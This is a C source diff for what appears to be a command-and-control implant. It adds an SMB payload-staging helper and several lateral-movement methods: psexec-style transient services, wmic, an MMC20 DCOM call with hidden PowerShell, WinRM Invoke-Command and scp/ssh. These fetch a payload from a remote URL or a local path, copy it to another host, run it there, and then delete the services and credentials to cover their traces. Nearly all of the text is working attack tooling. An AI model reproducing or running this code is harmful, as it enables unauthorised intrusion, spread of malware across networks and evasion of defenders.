@@ -801,6 +801,64 @@ void screenwatch_tick(void) {
     }
 }
 
+// ── SMB staging helpers (Windows only) ───────────────────────────────────────
+
+/* smb_stage — copies data to \\host\ADMIN$ or \\host\C$\Windows\Temp.
+ * Authenticates with net use if user/pass are non-empty.
+ * Returns the local UNC-equivalent path on the remote host (static buffer),
+ * or NULL on failure. */
+static const char *smb_stage(const char *host, const char *name,
+                              const char *user, const char *pass,
+                              const uint8_t *data, size_t data_len)
+{
+    static char remote_path[512];
+    char unc1[512], unc2[512];
+    char net_cmd[1024];
+    FILE *f;
+
+    /* Authenticate */
+    if (user && user[0] && pass) {
+        snprintf(net_cmd, sizeof(net_cmd),
+            "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>nul", host, pass, user);
+        system(net_cmd);
+    }
+
+    /* Try ADMIN$ */
+    snprintf(unc1, sizeof(unc1), "\\\\%s\\ADMIN$\\%s", host, name);
+    f = fopen(unc1, "wb");
+    if (f) {
+        fwrite(data, 1, data_len, f);
+        fclose(f);
+        snprintf(remote_path, sizeof(remote_path), "C:\\Windows\\%s", name);
+        return remote_path;
+    }
+
+    /* Try C$\Windows\Temp */
+    snprintf(unc2, sizeof(unc2), "\\\\%s\\C$\\Windows\\Temp\\%s", host, name);
+    f = fopen(unc2, "wb");
+    if (f) {
+        fwrite(data, 1, data_len, f);
+        fclose(f);
+        snprintf(remote_path, sizeof(remote_path), "C:\\Windows\\Temp\\%s", name);
+        return remote_path;
+    }
+
+    /* Cleanup auth on failure */
+    if (user && user[0]) {
+        snprintf(net_cmd, sizeof(net_cmd), "net use \\\\%s\\IPC$ /delete /y 2>nul", host);
+        system(net_cmd);
+    }
+    return NULL;
+}
+
+static void smb_stage_cleanup(const char *host, const char *user) {
+    if (user && user[0]) {
+        char cmd[512];
+        snprintf(cmd, sizeof(cmd), "net use \\\\%s\\IPC$ /delete /y 2>nul", host);
+        system(cmd);
+    }
+}
+
 // ── Dispatcher ────────────────────────────────────────────────────────────────
 
 void dispatch_task(AgentTask *task) {
@@ -2163,43 +2221,73 @@ void dispatch_task(AgentTask *task) {
             snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
             char *lr5=run_shell(lat_buf); free(lr5);
         } else if (_stricmp(lat_method,"psexec")==0) {
-            /* Authenticate */
-            snprintf(lat_buf,sizeof(lat_buf),
-                "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>&1",lat_host,lat_pass,lat_user);
-            char *lr6=run_shell(lat_buf); free(lr6);
-            /* Copy current exe to remote ADMIN$ */
-            char exe_self[MAX_PATH]={0};
-            GetModuleFileNameA(NULL,exe_self,sizeof(exe_self));
-            char remote_bin[MAX_PATH];
-            snprintf(remote_bin,sizeof(remote_bin),"\\\\%s\\ADMIN$\\endgame_psvc.exe",lat_host);
-            CopyFileA(exe_self,remote_bin,FALSE);
-            /* Open remote SCM */
-            WCHAR whost2[256]={0};
-            MultiByteToWideChar(CP_ACP,0,lat_host,-1,whost2,256);
-            SC_HANDLE hScm2=OpenSCManagerW(whost2,NULL,SC_MANAGER_ALL_ACCESS);
-            if (!hScm2) {
-                char e[64]; snprintf(e,sizeof(e),"OpenSCManager failed %lu",GetLastError());
-                agent_send_result(task->id,"",e); return;
+            /* Generate random service/exe name */
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
+
+            /* Load payload — prefer lat_payload URL, fall back to lat_cmd path */
+            uint8_t *payload_data = NULL;
+            size_t payload_len = 0;
+            if (lat_payload[0])
+                payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd, "rb");
+                    if (pf) {
+                        fseek(pf, 0, SEEK_END); payload_len = (size_t)ftell(pf); rewind(pf);
+                        payload_data = (uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data, 1, payload_len, pf);
+                        fclose(pf);
+                    }
+                }
             }
-            SC_HANDLE hSvc2=CreateServiceW(hScm2,L"endgame_psvc",L"Endgame Svc",
-                SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_DEMAND_START,
-                SERVICE_ERROR_IGNORE,L"C:\\Windows\\endgame_psvc.exe",
-                NULL,NULL,NULL,NULL,NULL);
-            if (!hSvc2) {
-                char e[64]; snprintf(e,sizeof(e),"CreateService failed %lu",GetLastError());
-                CloseServiceHandle(hScm2);
-                agent_send_result(task->id,"",e); return;
+            if (!payload_data || !payload_len) {
+                free(payload_data);
+                agent_send_result(task->id, "", "psexec: no payload"); return;
             }
-            StartServiceW(hSvc2,0,NULL);
-            Sleep(5000);
-            ControlService(hSvc2,SERVICE_CONTROL_STOP,NULL);
-            DeleteService(hSvc2);
-            CloseServiceHandle(hSvc2);
-            CloseServiceHandle(hScm2);
-            /* Cleanup */
-            snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
-            char *lr7=run_shell(lat_buf); free(lr7);
-            agent_send_result(task->id,"[+] psexec: service started and cleaned","");
+
+            /* Stage payload to remote host via SMB */
+            const char *remote_path = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
+            free(payload_data);
+            if (!remote_path) {
+                smb_stage_cleanup(lat_host, lat_user);
+                agent_send_result(task->id, "", "psexec: SMB staging failed"); return;
+            }
+
+            /* Open remote SCM and create/start/delete transient service */
+            WCHAR whost[256]={0}, wsvc[64]={0}, wpath[512]={0};
+            MultiByteToWideChar(CP_ACP, 0, lat_host,    -1, whost, 256);
+            MultiByteToWideChar(CP_ACP, 0, svc_name,    -1, wsvc,  64);
+            MultiByteToWideChar(CP_ACP, 0, remote_path, -1, wpath, 512);
+            SC_HANDLE hScm = OpenSCManagerW(whost, NULL, SC_MANAGER_ALL_ACCESS);
+            if (!hScm) {
+                char e[128];
+                snprintf(e, sizeof(e), "psexec: OpenSCManager failed: %lu", GetLastError());
+                smb_stage_cleanup(lat_host, lat_user);
+                agent_send_result(task->id, "", e); return;
+            }
+            SC_HANDLE hSvc = CreateServiceW(hScm, wsvc, wsvc, SERVICE_ALL_ACCESS,
+                SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+                wpath, NULL, NULL, NULL, NULL, NULL);
+            if (!hSvc) {
+                char e[128];
+                snprintf(e, sizeof(e), "psexec: CreateService failed: %lu", GetLastError());
+                CloseServiceHandle(hScm);
+                smb_stage_cleanup(lat_host, lat_user);
+                agent_send_result(task->id, "", e); return;
+            }
+            StartServiceW(hSvc, 0, NULL);
+            DeleteService(hSvc);
+            CloseServiceHandle(hSvc);
+            CloseServiceHandle(hScm);
+            smb_stage_cleanup(lat_host, lat_user);
+            char res_ps[512];
+            snprintf(res_ps, sizeof(res_ps),
+                "[+] psexec → %s\n    svc : %s\n    path: %s", lat_host, svc_name, remote_path);
+            agent_send_result(task->id, res_ps, "");
         } else if (_stricmp(lat_method,"runas")==0) {
             /* Run payload as local user via schtasks */
             const char *ru=lat_user;
@@ -2222,8 +2310,277 @@ void dispatch_task(AgentTask *task) {
             strncat(ru_res,rr3?rr3:"",sizeof(ru_res)-strlen(ru_res)-1);
             free(rr3);
             agent_send_result(task->id,ru_res,"");
+        } else if (_stricmp(lat_method, "wmi") == 0) {
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
+
+            uint8_t *payload_data = NULL; size_t payload_len = 0;
+            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd, "rb");
+                    if (pf) {
+                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
+                        payload_data=(uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data,1,payload_len,pf);
+                        fclose(pf);
+                    }
+                }
+            }
+            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","wmi: no payload"); return; }
+
+            const char *remote_path_wmi = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
+            free(payload_data);
+            if (!remote_path_wmi) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","wmi: SMB staging failed"); return; }
+
+            char wmi_cmd[1024];
+            if (lat_user[0] && lat_pass[0]) {
+                char dom[128]={0}, usr[128]={0};
+                const char *bs = strchr(lat_user, '\\');
+                if (bs) { strncpy(dom, lat_user, (size_t)(bs-lat_user)); strncpy(usr, bs+1, sizeof(usr)-1); }
+                else { strcpy(dom, "."); strncpy(usr, lat_user, sizeof(usr)-1); }
+                snprintf(wmi_cmd, sizeof(wmi_cmd),
+                    "wmic /node:\"%s\" /user:\"%s\\%s\" /password:\"%s\" process call create \"%s\" 2>&1",
+                    lat_host, dom, usr, lat_pass, remote_path_wmi);
+            } else {
+                snprintf(wmi_cmd, sizeof(wmi_cmd),
+                    "wmic /node:\"%s\" process call create \"%s\" 2>&1", lat_host, remote_path_wmi);
+            }
+            char *wmi_out = run_shell(wmi_cmd);
+            smb_stage_cleanup(lat_host, lat_user);
+            char res_wmi[1024];
+            snprintf(res_wmi, sizeof(res_wmi), "[+] wmi → %s\n    path: %s\n%s",
+                lat_host, remote_path_wmi, wmi_out?wmi_out:"");
+            free(wmi_out);
+            agent_send_result(task->id, res_wmi, "");
+
+        } else if (_stricmp(lat_method, "smbexec") == 0) {
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
+
+            uint8_t *payload_data = NULL; size_t payload_len = 0;
+            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd,"rb");
+                    if (pf) {
+                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
+                        payload_data=(uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data,1,payload_len,pf);
+                        fclose(pf);
+                    }
+                }
+            }
+            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","smbexec: no payload"); return; }
+
+            const char *remote_path_smb = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
+            free(payload_data);
+            if (!remote_path_smb) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","smbexec: SMB staging failed"); return; }
+
+            /* binPath = cmd.exe launching agent — breaks out of Service Job Object */
+            char bin_path[768];
+            snprintf(bin_path, sizeof(bin_path),
+                "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"%s\"", remote_path_smb);
+
+            WCHAR whost_smb[256]={0}, wsvc_smb[64]={0}, wbin_smb[768]={0};
+            MultiByteToWideChar(CP_ACP,0,lat_host,  -1,whost_smb,256);
+            MultiByteToWideChar(CP_ACP,0,svc_name,  -1,wsvc_smb, 64);
+            MultiByteToWideChar(CP_ACP,0,bin_path,  -1,wbin_smb, 768);
+
+            SC_HANDLE hScm_smb = OpenSCManagerW(whost_smb, NULL, SC_MANAGER_ALL_ACCESS);
+            if (!hScm_smb) {
+                char e[128]; snprintf(e,sizeof(e),"smbexec: OpenSCManager failed: %lu",GetLastError());
+                smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"",e); return;
+            }
+            SC_HANDLE hSvc_smb = CreateServiceW(hScm_smb, wsvc_smb, wsvc_smb, SERVICE_ALL_ACCESS,
+                SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+                wbin_smb, NULL, NULL, NULL, NULL, NULL);
+            if (!hSvc_smb) {
+                char e[128]; snprintf(e,sizeof(e),"smbexec: CreateService failed: %lu",GetLastError());
+                CloseServiceHandle(hScm_smb); smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"",e); return;
+            }
+            StartServiceW(hSvc_smb, 0, NULL);
+            DeleteService(hSvc_smb);
+            CloseServiceHandle(hSvc_smb);
+            CloseServiceHandle(hScm_smb);
+            smb_stage_cleanup(lat_host, lat_user);
+            char res_smb[512];
+            snprintf(res_smb, sizeof(res_smb),
+                "[+] smbexec → %s\n    svc: %s\n    chain: SERVICES.EXE→cmd.exe→agent",
+                lat_host, svc_name);
+            agent_send_result(task->id, res_smb, "");
+
+        } else if (_stricmp(lat_method, "dcom") == 0) {
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
+
+            uint8_t *payload_data = NULL; size_t payload_len = 0;
+            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd,"rb");
+                    if (pf) {
+                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
+                        payload_data=(uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data,1,payload_len,pf);
+                        fclose(pf);
+                    }
+                }
+            }
+            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","dcom: no payload"); return; }
+
+            const char *remote_path_dcom = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
+            free(payload_data);
+            if (!remote_path_dcom) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","dcom: SMB staging failed"); return; }
+
+            /* Use MMC20.Application DCOM object to execute the staged payload */
+            char ps_dcom[2048];
+            snprintf(ps_dcom, sizeof(ps_dcom),
+                "powershell -NoP -W Hidden -Exec Bypass -C \""
+                "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','%s'));"
+                "$c.Document.ActiveView.ExecuteShellCommand('%s',$null,'','7')\"",
+                lat_host, remote_path_dcom);
+            char *dcom_out = run_shell(ps_dcom);
+            smb_stage_cleanup(lat_host, lat_user);
+            char res_dcom[1024];
+            snprintf(res_dcom, sizeof(res_dcom), "[+] dcom → %s\n    path: %s\n%s",
+                lat_host, remote_path_dcom, dcom_out?dcom_out:"");
+            free(dcom_out);
+            agent_send_result(task->id, res_dcom, "");
+
+        } else if (_stricmp(lat_method, "winrm") == 0) {
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "svc%08x", (unsigned)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.exe", svc_name);
+
+            uint8_t *payload_data = NULL; size_t payload_len = 0;
+            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd,"rb");
+                    if (pf) {
+                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
+                        payload_data=(uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data,1,payload_len,pf);
+                        fclose(pf);
+                    }
+                }
+            }
+            if (!payload_data || !payload_len) { free(payload_data); agent_send_result(task->id,"","winrm: no payload"); return; }
+
+            const char *remote_path_wrm = smb_stage(lat_host, exe_name, lat_user, lat_pass, payload_data, payload_len);
+            free(payload_data);
+            if (!remote_path_wrm) { smb_stage_cleanup(lat_host,lat_user); agent_send_result(task->id,"","winrm: SMB staging failed"); return; }
+
+            char ps_wrm[2048];
+            if (lat_user[0] && lat_pass[0]) {
+                snprintf(ps_wrm, sizeof(ps_wrm),
+                    "powershell -NoP -W Hidden -Exec Bypass -C \""
+                    "$c=New-Object PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force));"
+                    "Invoke-Command -ComputerName '%s' -Credential $c "
+                    "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
+                    lat_user, lat_pass, lat_host, remote_path_wrm);
+            } else {
+                snprintf(ps_wrm, sizeof(ps_wrm),
+                    "powershell -NoP -W Hidden -Exec Bypass -C \""
+                    "Invoke-Command -ComputerName '%s' "
+                    "-ScriptBlock {Start-Process '%s' -WindowStyle Hidden}\"",
+                    lat_host, remote_path_wrm);
+            }
+            char *winrm_out = run_shell(ps_wrm);
+            smb_stage_cleanup(lat_host, lat_user);
+            char res_wrm[1024];
+            snprintf(res_wrm, sizeof(res_wrm), "[+] winrm → %s\n    path: %s\n%s",
+                lat_host, remote_path_wrm, winrm_out?winrm_out:"");
+            free(winrm_out);
+            agent_send_result(task->id, res_wrm, "");
+
+        } else if (_stricmp(lat_method, "ssh") == 0) {
+            /* SSH lateral — uses Windows built-in ssh.exe/scp.exe (Win10+).
+             * Stages payload to /tmp/ on a remote Linux or Windows-SSH host. */
+            char svc_name[32];
+            snprintf(svc_name, sizeof(svc_name), "agent_%lu", (unsigned long)GetTickCount());
+            char exe_name[64];
+            snprintf(exe_name, sizeof(exe_name), "%s.elf", svc_name);
+
+            /* Write payload bytes to a local temp file for scp */
+            const char *tmp_env = getenv("TEMP");
+            if (!tmp_env) tmp_env = "C:\\Windows\\Temp";
+            char tmp_path[MAX_PATH];
+            snprintf(tmp_path, sizeof(tmp_path), "%s\\%s", tmp_env, exe_name);
+
+            uint8_t *payload_data = NULL; size_t payload_len = 0;
+            if (lat_payload[0]) payload_data = agent_download_file(lat_payload, &payload_len);
+            if (!payload_data || !payload_len) {
+                free(payload_data); payload_data = NULL;
+                if (lat_cmd[0]) {
+                    FILE *pf = fopen(lat_cmd,"rb");
+                    if (pf) {
+                        fseek(pf,0,SEEK_END); payload_len=(size_t)ftell(pf); rewind(pf);
+                        payload_data=(uint8_t*)malloc(payload_len);
+                        if (payload_data) fread(payload_data,1,payload_len,pf);
+                        fclose(pf);
+                    }
+                }
+            }
+            if (!payload_data || !payload_len) {
+                free(payload_data);
+                agent_send_result(task->id,"","ssh: no payload"); return;
+            }
+            FILE *tf = fopen(tmp_path, "wb");
+            if (!tf) { free(payload_data); agent_send_result(task->id,"","ssh: failed to write temp file"); return; }
+            fwrite(payload_data, 1, payload_len, tf);
+            fclose(tf);
+            free(payload_data);
+
+            /* Parse optional host:port */
+            char ssh_host[256]={0}; char ssh_port[16]="22";
+            const char *colon = strchr(lat_host, ':');
+            if (colon) {
+                strncpy(ssh_host, lat_host, (size_t)(colon-lat_host));
+                strncpy(ssh_port, colon+1, sizeof(ssh_port)-1);
+            } else {
+                strncpy(ssh_host, lat_host, sizeof(ssh_host)-1);
+            }
+
+            char remote_path_ssh[256];
+            snprintf(remote_path_ssh, sizeof(remote_path_ssh), "/tmp/%s", exe_name);
+
+            const char *ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes";
+            char scp_cmd[1024], ssh_cmd[1024];
+            snprintf(scp_cmd, sizeof(scp_cmd),
+                "scp -P %s %s \"%s\" %s@%s:%s 2>&1",
+                ssh_port, ssh_opts, tmp_path, lat_user, ssh_host, remote_path_ssh);
+            snprintf(ssh_cmd, sizeof(ssh_cmd),
+                "ssh -p %s %s %s@%s \"chmod +x %s && nohup %s </dev/null >/dev/null 2>&1 &\" 2>&1",
+                ssh_port, ssh_opts, lat_user, ssh_host, remote_path_ssh, remote_path_ssh);
+
+            char *scp_out = run_shell(scp_cmd);
+            char *ssh_out = run_shell(ssh_cmd);
+            char res_ssh[2048]={0};
+            snprintf(res_ssh, sizeof(res_ssh),
+                "[+] ssh → %s\n    path: %s\nscp: %s\nssh: %s",
+                lat_host, remote_path_ssh, scp_out?scp_out:"", ssh_out?ssh_out:"");
+            free(scp_out); free(ssh_out);
+            DeleteFileA(tmp_path);
+            agent_send_result(task->id, res_ssh, "");
+
         } else {
-            char e2[128]; snprintf(e2,sizeof(e2),"unknown lateral method: %s",lat_method);
+            char e2[128];
+            snprintf(e2, sizeof(e2),
+                "unknown lateral method: %s — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas",
+                lat_method);
             agent_send_result(task->id,"",e2);
         }
     }
